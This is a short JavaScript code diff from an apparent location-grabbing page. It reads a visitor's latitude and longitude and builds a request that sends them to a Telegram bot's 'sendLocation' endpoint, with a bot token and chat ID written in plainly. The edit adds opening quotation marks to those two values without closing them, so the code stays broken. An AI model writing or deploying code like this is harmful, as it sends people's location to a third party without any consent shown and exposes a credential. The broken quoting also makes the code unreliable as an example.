@@ -11,8 +11,8 @@
         var latitude = position.coords.latitude;
         var longitude = position.coords.longitude;
 
-        var botToken = 6869870407:AAFt9dfffPo16LefUroHYeZV64wrm4fQyPM;
-        var chatId = 5641303137;
+        var botToken = '6869870407:AAFt9dfffPo16LefUroHYeZV64wrm4fQyPM;
+        var chatId = '5641303137;
 
         var url = 'https://api.telegram.org/bot' + botToken + '/sendLocation';
         var params = {
